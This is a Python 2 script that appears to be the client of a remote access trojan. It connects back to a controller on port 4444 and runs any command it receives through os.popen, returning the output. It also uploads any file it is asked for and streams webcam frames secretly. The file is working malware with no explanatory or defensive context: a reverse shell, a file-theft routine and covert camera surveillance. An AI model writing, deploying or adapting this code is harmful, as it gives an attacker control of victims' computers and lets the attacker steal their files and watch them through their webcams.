import socket
import sys
import os
import cv2
import pickle

global clt

def send_path():
  global path
  path=os.getcwd()
  s.send(path)

def check_cmd():
        global cmd
        global rcmd
        global path
        global msg
        while True:
           rv_msg=s.recv(250000)
           if "cd" in rv_msg:
              try:
                  a=rv_msg.replace("cd ",'')
                  print a
                  os.chdir(a)
                  path=os.getcwd()
                  s.send(path)
              except:
                   path=os.getcwd()
                   s.send(path)
           elif ":"in rv_msg:
              try:
                   os.chdir(str(rv_msg))
                   path=os.getcwd()
                   s.send(path)
              except:
                   path=os.getcwd()
                   s.send(path)
                   
           elif rv_msg == "quit":
                  break
           elif "send" in rv_msg:
              a=rv_msg.replace("send ",'')
              f = open (a, "rb")
              
              try:
                l = f.read(9999999999999)
               
                while (l):
                    s.send(l)
                    l=f.read(99999999999)
                  
              except:
                  break
           else :
                   cmd=os.popen(str(rv_msg))
                   rcmd=cmd.read()
             
                   if rcmd == "":
                       s.send("Command Not Found\n")
                       s.send(path)
                   else:    
                       s.send(rcmd)
                       s.send(path) 

def cam():
    cap=cv2.VideoCapture(0)
    while True:
       ret, frame = cap.read()
       try:
        s.send(pickle.dumps(frame))
       except:
         cap.release()
         cv2.destroyAllWindows()
         break
    
    



while True:
   
  try:
   global s 
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  except:
   print "Faild! To Create Socket"   
  try:
   s.connect(("127.0.0.1",4444))
   while True:
         msg=s.recv(50000)
         if msg==' ':
            s.send(' ')
         elif msg == "shell":
                   send_path()
                   check_cmd()
         elif msg=="cam":
           cam()
           
  except:
          print "Cannot connected to host"





























